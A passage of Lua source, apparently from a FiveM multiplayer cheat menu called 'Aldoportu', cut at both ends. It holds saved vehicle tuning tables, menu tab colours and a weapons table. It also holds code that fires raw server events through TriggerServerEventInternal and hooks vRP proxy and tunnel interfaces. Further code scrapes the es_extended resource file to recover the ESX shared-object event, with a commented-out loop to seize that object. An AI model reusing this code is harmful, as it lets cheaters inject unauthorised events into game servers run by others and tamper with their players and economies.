-1,["modPlateHolder"] = -1,["modRearBumper"] = 0,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 4,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 134,["modFrame"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 2,["modAerials"] = -1,}},
			
			{name = 'Dodge Challenger 2016', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 5,["suspensionRaise"] = 0.0,["fuelLevel"] = 60.0,["modLivery"] = 0,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = 0,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 7.5,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = -216150906,["modAPlate"] = -1,["modHood"] = 4,["wheelColor"] = 12,["modRightFender"] = 0,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["1"] = false,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 28,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = 2,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 4,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = 0,["color2"] = 28,["modFrame"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 4,["modAerials"] = -1,}},
			{name = 'Dodge Charger 2016', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 6,["suspensionRaise"] = 0.0,["fuelLevel"] = 60.0,["modLivery"] = 4,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 5.2,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = -1513691047,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 12,["modRightFender"] = 1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 2,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { } ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = 1,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 28,["modFrame"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 0,["modAerials"] = -1,}},
			{name = 'Dodge Viper 1999', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = -1,["suspensionRaise"] = -0.0099999997764826,["fuelLevel"] = 60.0,["modLivery"] = 0,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = -1,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 10.2,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 726460559,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 28,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { } ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 28,["modFrame"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 1,["modAerials"] = -1,}},
			
			{name = 'Ford Mustang 1995', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 2,["suspensionRaise"] = 0.0,["fuelLevel"] = 60.0,["modLivery"] = -1,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 89,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = 0,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 3.2,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 688884119,["modAPlate"] = -1,["modHood"] = 3,["wheelColor"] = 12,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["1"] = true,["2"] = true,["3"] = true,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 138,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 7,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = 1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 89,["modFrame"] = 1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 5,["modAerials"] = -1,}},
			{name = 'Ford Mustang 2019', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 6,["suspensionRaise"] = 0.0,["fuelLevel"] = 60.0,["modLivery"] = 5,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = 1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 3,["modTrunk"] = -1,["dirtLevel"] = 10.1,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = 1311724675,["modAPlate"] = -1,["modHood"] = 1,["wheelColor"] = 156,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { } ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 1,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = -1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 89,["modFrame"] = 0,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 5,["modAerials"] = -1,}},
			
			{name = 'Honda S2000 AP2', props = {["modOrnaments"] = -1,["modTrimB"] = -1,["modTank"] = -1,["modFrontBumper"] = 1,["suspensionRaise"] = -0.070000000298023,["fuelLevel"] = 60.0,["modLivery"] = -1,["modBrakes"] = 2,["windowTint"] = 1,["modSideSkirt"] = 0,["modEngineBlock"] = -1,["tyreSmokeColor"] = { [1] = 255,[2] = 255,[3] = 255,["n"] = 3,} ,["pearlescentColor"] = 12,["modDoorSpeaker"] = -1,["modTransmission"] = 2,["modRoof"] = -1,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modSuspension"] = 2,["modTrunk"] = -1,["dirtLevel"] = 5.2,["modSteeringWheel"] = -1,["xenonColor"] = 255,["modArchCover"] = -1,["model"] = -1549019518,["modAPlate"] = -1,["modHood"] = 0,["wheelColor"] = 12,["modRightFender"] = -1,["modXenon"] = 1,["modWindows"] = -1,["bodyHealth"] = 1000.0,["engineHealth"] = 1000.0,["modHydrolic"] = -1,["modExhaust"] = 0,["modSmokeEnabled"] = 1,["modShifterLeavers"] = -1,["modSeats"] = -1,["extras"] = { ["2"] = false,} ,["modArmor"] = 4,["modTurbo"] = 1,["modTrimA"] = -1,["color1"] = 12,["modEngine"] = 3,["modVanityPlate"] = -1,["wheels"] = 0,["modFender"] = -1,["modPlateHolder"] = -1,["modRearBumper"] = 1,["modHorns"] = -1,["modFrontWheels"] = -1,["modBackWheels"] = -1,["modAirFilter"] = -1,["modDashboard"] = -1,["plateIndex"] = 1,["modDial"] = -1,["modStruts"] = -1,["modGrille"] = -1,["color2"] = 0,["modFrame"] = 1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["modSpeakers"] = -1,["modSpoilers"] = 1,["modAerials"] = -1,}},

			{name = 'Range Rover Vogue ST', props = {["fuelLevel"] = 60.0,["modRightFender"] = 0,["suspensionRaise"] = -0.029999995604157,["modLivery"] = -1,["modDial"] = -1,["color1"] = 134,["modDashboard"] = -1,["modOrnaments"] = -1,["modFrontBumper"] = 1,["modSuspension"] = 3,["modAPlate"] = -1,["modTransmission"] = 2,["modTrimB"] = -1,["modAerials"] = -1,["modArchCover"] = -1,["modBackWheels"] = -1,["neonColor"] = { [1] = 255,[2] = 0,[3] = 255,["n"] = 3,} ,["plateIndex"] = 0,["modBrakes"] = 2,["windowTint"] = 1,["modAirFilter"] = -1,["modStruts"] = -1,["extras"] = { ["1"] = false,["2"] = true,} ,["modFrontWheels"] = -1,["wheels"] = 3,["modTrunk"] = -1,["modSpeakers"] = -1,["modSteeringWheel"] = -1,["modTrimA"] = -1,["modExhaust"] = 1,["modSideSkirt"] = -1,["pearlescentColor"] = 12,["modRoof"] = -1,["modSpoilers"] = 0,["modSeats"] = -1,["modRearBumper"] = -1,["modHood"] = 1,["modDoorSpeaker"] = -1,["modTurbo"] = 1,["modSmokeEnabled"] = 1,["tyreSmokeColor"] = { [1] = 255,[2] = 0,[3] = 0,["n"] = 3,} ,["modWindows"] = -1,["modTank"] = -1,["modXenon"] = 1,["modVanityPlate"] = -1,["engineHealth"] = 1000.0,["wheelColor"] = 111,["modPlateHolder"] = -1,["modEngineBlock"] = -1,["modEngine"] = 3,["bodyHealth"] = 1000.0,["modArmor"] = 4,["color2"] = 150,["modHorns"] = -1,["modShifterLeavers"] = -1,["modHydrolic"] = -1,["modFrame"] = 0,["xenonColor"] = 255,["model"] = 1993609528,["modFender"] = 0,["neonEnabled"] = { [1] = false,[2] = false,[3] = false,[4] = false,} ,["modGrille"] = 1,["dirtLevel"] = 4.0,}},
		},
		savedVehiclesOptionsHandle = nil,
		savedVehiclesOptionsDeleteHandle = nil,
	},

	mainColor = {
		r = 225, 
		g = 55, 
		b = 55, 
		a = 255
	},
	menuTabsColors = {
		selfOptions = {r=255, g=255, b=255},
		onlineOptions = {r=255, g=255, b=255},
		visualOptions = {r=255, g=255, b=255},
		teleportOptions = {r=255, g=255, b=255},
		vehicleOptions = {r=255, g=255, b=255},
		weaponOptions = {r=255, g=255, b=255},
		serverOptions = {r=255, g=255, b=255},
		menuOptions = {r=255, g=255, b=255}
	},
}

Aldoportu.dTCE = function(delayed, server, event, ...)
	if delayed then 
		pCreateThread(function() pWait(50) end)
	end
	
	local payload = msgpack.pack({...})
	if server then
		TriggerServerEventInternal(event, payload, payload:len())
	else
		TriggerEventInternal(event, payload, payload:len())
	end
end

--[[ PROXY CLIENT-SIDE VERSION (https://github.com/ImagicTheCat/vRP)]]
--[[ Proxy interface system, used to add/call functions between resources]]
local Proxy = {}
local proxy_rdata = {}
local function proxy_callback(rvalues)
    proxy_rdata = rvalues
end
local function proxy_resolve(itable, key)
    local iname = getmetatable(itable).name
    local fcall = function(args, callback)
        if args == nil then
            args = {}
        end
        Aldoportu.dTCE(false, false, iname .. ":proxy", key, args, proxy_callback)
        return table.unpack(proxy_rdata)
    end
    itable[key] = fcall
    return fcall
end
function Proxy.addInterface(name, itable)
    AddEventHandler(
        name .. ":proxy",
        function(member, args, callback)
            local f = itable[member]
            if type(f) == "function" then
                callback({f(table.unpack(args))})
            else
            end
        end
    )
end
function Proxy.getInterface(name)
    local r = setmetatable({}, {__index = proxy_resolve, name = name})
    return r
end
--[[ TUNNEL CLIENT SIDE VERSION (https://github.com/ImagicTheCat/vRP)]]
local Tools = {}
local IDGenerator = {}
function Tools.newIDGenerator()
    local r = setmetatable({}, {__index = IDGenerator})
    r:construct()
    return r
end
function IDGenerator:construct()
    self:clear()
end
function IDGenerator:clear()
    self.max = 0
    self.ids = {}
end
function IDGenerator:gen()
    if #self.ids > 0 then
        return table.remove(self.ids)
    else
        local r = self.max
        self.max = self.max + 1
        return r
    end
end
function IDGenerator:free(id)
    table.insert(self.ids, id)
end
local Tunnel = {}
local function tunnel_resolve(itable, key)
    local mtable = getmetatable(itable)
    local iname = mtable.name
    local ids = mtable.tunnel_ids
    local callbacks = mtable.tunnel_callbacks
    local identifier = mtable.identifier
    local fcall = function(args, callback)
        if args == nil then
            args = {}
        end
        if type(callback) == "function" then
            local rid = ids:gen()
            callbacks[rid] = callback
            Aldoportu.dTCE(false, true, iname .. ":tunnel_req", key, args, identifier, rid)
        else
            Aldoportu.dTCE(false, true, iname .. ":tunnel_req", key, args, "", -1)
        end
    end
    itable[key] = fcall
    return fcall
end
function Tunnel.bindInterface(name, interface)
    RegisterNetEvent(name .. ":tunnel_req")
    AddEventHandler(
        name .. ":tunnel_req",
        function(member, args, identifier, rid)
            local f = interface[member]
            local delayed = false
            local rets = {}
            if
                type(f) == "function" 
             then
                TUNNEL_DELAYED = function()
                    delayed = true
                    return function(rets)
                        rets = rets or {}
                        if rid >= 0 then
                            Aldoportu.dTCE(false, true, name .. ":" .. identifier .. ":tunnel_res", rid, rets)
                        end
                    end
                end
                rets = {f(table.unpack(args))}
            end
            if not delayed and rid >= 0 then
                Aldoportu.dTCE(false, true, name .. ":" .. identifier .. ":tunnel_res", rid, rets)
            end
        end
    )
end
function Tunnel.getInterface(name, identifier)
    local ids = Tools.newIDGenerator()
    local callbacks = {}
    local r =
        setmetatable(
        {},
        {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier}
    )
    RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")
    AddEventHandler(
        name .. ":" .. identifier .. ":tunnel_res",
        function(rid, args)
            local callback = callbacks[rid]
            if callback ~= nil then
                ids:free(rid)
                callbacks[rid] = nil
                callback(table.unpack(args))
            end
        end
    )
    return r
end
local vRP = Proxy.getInterface("vRP")

Aldoportu.datastore.es_extended = Aldoportu.natives.loadResourceFile('es_extended', 'client/common.lua')
if Aldoportu.datastore.es_extended and string.len(Aldoportu.datastore.es_extended) > 65 then
	local toFilter = {
		'AddEventHandler',
		'cb',
		'function ',
		'exports',
		'return ESX',
		'return ExM',
		'getExtendedModeObject',
		'(ESX)',
		'function',
		'getSharedObject%(%)',
		'end',
		'%(',
		'%)',
		',',
		'\'',
		'"',
		'UG',
		'tonum',
		'\n',
		'%s+',
	}
	for i=1, #toFilter do
		Aldoportu.datastore.es_extended = Aldoportu.datastore.es_extended:gsub(toFilter[i], '')
	end
end

--[[pCreateThread(function()
	while Aldoportu.shouldShowMenu and Aldoportu.datastore.es_extended and Aldoportu.datastore.ESX == nil do
		Aldoportu.dTCE(false, false, tostring(Aldoportu.datastore.es_extended), function(a) Aldoportu.datastore.ESX = a end)
		pWait(30000)
	end
end)]]

Aldoportu.trashTables.weaponsTable = { Melee = { BaseballBat = { id = 'weapon_bat', name = '~s~~s~Baseball Bat', bInfAmmo = false, mods = {} }, BrokenBottle = { id = 'weapon_bottle', name = '~s~~s~Broken Bottle', bInfAmmo = false, mods = {} }, Crowbar = { id = 'weapon_Crowbar', name = '~s~~s~Crowbar', bInfAmmo = false, mods = {} }, Flashlight = { id = 'weapon_flashlight', name = '~s~~s~Flashlight', bInfAmmo = false, mods = {} }, GolfClub = { id = 'weapon_golfclub', name = '~s~~s~Golf Club', bInfAmmo = false, mods = {} }, BrassKnuckles = { id = 'weapon_knuckle', name = '~s~~s~Brass Knuckles', bInfAmmo = false, mods = {} }, Knife = { id = 'weapon_knife', name = '~s~~s~Knife', bInfAmmo = false, mods = {} }, Machete = { id = 'weapon_machete', name = '~s~~s~Machete', bInfAmmo = false, mods = {} }, Switchblade = { id = 'weapon_switchblade', name = '~s~~s~Switchblade', bInfAmmo = false, mods = {} }, Nightstick = { id = 'weapon_nightstick', name = '~s~~s~Nightstick', bInfAmmo = false, mods = {} }, BattleAxe = { id = 'weapon_battleaxe', name = '~s~~s~Battle Axe', bInfAmmo = false, mods = {} } }, Handguns = { Pistol = { id = 'weapon_pistol', name = '~s~~s~Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_PISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_PISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, PistolMK2 = { id = 'weapon_pistol_mk2', name = '~s~~s~Pistol MK 2', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_PISTOL_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_PISTOL_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Mounted Scope', id = 'COMPONENT_AT_PI_RAIL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH_02' } }, BarrelAttachments = { { name = '~s~~s~Compensator', id = 'COMPONENT_AT_PI_COMP' }, { name = '~s~~s~Suppessor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, CombatPistol = { id = 'weapon_combatpistol', name = '~s~~s~Combat Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATPISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, APPistol = { id = 'weapon_appistol', name = '~s~~s~AP Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_APPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_APPISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, StunGun = { id = 'weapon_stungun', name = '~s~~s~Stun Gun', bInfAmmo = false, mods = {} }, Pistol50 = { id = 'weapon_pistol50', name = '~s~~s~Pistol .50', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_PISTOL50_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_PISTOL50_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, SNSPistol = { id = 'weapon_snspistol', name = '~s~~s~SNS Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SNSPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SNSPISTOL_CLIP_02' } } } }, SNSPistolMkII = { id = 'weapon_snspistol_mk2', name = '~s~~s~SNS Pistol Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Mounted Scope', id = 'COMPONENT_AT_PI_RAIL_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH_03' } }, BarrelAttachments = { { name = '~s~~s~Compensator', id = 'COMPONENT_AT_PI_COMP_02' }, { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, HeavyPistol = { id = 'weapon_heavypistol', name = '~s~~s~Heavy Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_HEAVYPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_HEAVYPISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, VintagePistol = { id = 'weapon_vintagepistol', name = '~s~~s~Vintage Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_VINTAGEPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_VINTAGEPISTOL_CLIP_02' } }, BarrelAttachments = { { 'Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, FlareGun = { id = 'weapon_flaregun', name = '~s~~s~Flare Gun', bInfAmmo = false, mods = {} }, MarksmanPistol = { id = 'weapon_marksmanpistol', name = '~s~~s~Marksman Pistol', bInfAmmo = false, mods = {} }, HeavyRevolver = { id = 'weapon_revolver', name = '~s~~s~Heavy Revolver', bInfAmmo = false, mods = {} }, HeavyRevolverMkII = { id = 'weapon_revolver_mk2', name = '~s~~s~Heavy Revolver Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_01' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Compensator', id = 'COMPONENT_AT_PI_COMP_03' } } } }, DoubleActionRevolver = { id = 'weapon_doubleaction', name = '~s~~s~Double Action Revolver', bInfAmmo = false, mods = {} }, UpnAtomizer = { id = 'weapon_raypistol', name = '~s~~s~Up-n-Atomizer', bInfAmmo = false, mods = {} } }, SMG = { MicroSMG = { id = 'weapon_microsmg', name = '~s~~s~Micro SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MICROSMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MICROSMG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } } } }, SMG = { id = 'weapon_smg', name = '~s~~s~SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SMG_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_SMG_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, SMGMkII = { id = 'weapon_smg_mk2', name = '~s~~s~SMG Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SMG_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SMG_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_SMG_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_SMG_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS_SMG' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_SB_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_SB_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } } } }, AssaultSMG = { id = 'weapon_assaultsmg', name = '~s~~s~Assault SMG', bInfAmmo = false, mods = { Magazines = { { name = 